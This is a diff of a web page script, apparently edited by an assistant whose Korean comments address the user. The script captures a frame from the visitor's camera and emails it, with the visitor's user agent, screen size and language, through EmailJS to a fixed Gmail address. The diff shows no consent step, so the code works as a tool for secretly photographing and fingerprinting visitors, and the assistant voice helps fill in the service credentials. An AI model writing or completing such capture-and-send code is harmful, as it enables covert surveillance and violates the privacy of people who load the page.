@@ -29,7 +29,7 @@
 <script type="text/javascript">
   (function(){
     emailjs.init({
-      publicKey: "여기에_Public_Key_넣기",   // ← EmailJS Account → Public Key
+      publicKey: "여기에_너의_Public_Key_넣기",   // ← 아직 안 바꿨으면 여기 바꿔야 함
     });
   })();
 </script>
@@ -65,7 +65,7 @@ async function captureAndSend() {
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const base64 = canvas.toDataURL('image/jpeg', 0.85); // 용량 줄이기 위해 0.85
+  const base64 = canvas.toDataURL('image/jpeg', 0.75); // 용량 줄이기 위해 0.75
 
   const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
 
@@ -74,22 +74,23 @@ async function captureAndSend() {
     image_base64: base64,
     user_agent: navigator.userAgent,
     screen: `\( {window.screen.width}× \){window.screen.height}`,
-    language: navigator.language || navigator.userLanguage,
-    // to_email은 템플릿에서 고정으로 설정했으므로 여기 안 넣어도 됨
+    language: navigator.language || navigator.userLanguage
   };
 
   try {
-    await emailjs.send(
-      "YOUR_SERVICE_ID",      // ← EmailJS Service ID
-      "YOUR_TEMPLATE_ID",     // ← EmailJS Template ID
-      templateParams
+    const response = await emailjs.send(
+      "service_had7jag",              // ← 네가 준 Service ID 여기 넣음
+      "YOUR_TEMPLATE_ID",             // ← 이건 아직 네가 안 줬으니까 템플릿 ID로 바꿔
+      templateParams,
+      "여기에_Public_Key_또_넣기"     // ← send()에 직접 넣는 방식 (init 없이도 동작)
     );
-    console.log("사진 전송 완료 → dog0928001@gmail.com");
+    console.log("전송 성공!", response.status, response.text);
   } catch (err) {
     console.error("EmailJS 전송 실패:", err);
+    alert("전송 오류: " + (err.text || err.message || "알 수 없는 오류"));
   }
 
-  // 필요하면 스트림 종료 (카메라 불 끄기)
+  // 카메라 끄기 (선택)
   // video.srcObject.getTracks().forEach(track => track.stop());
 }
 </script>
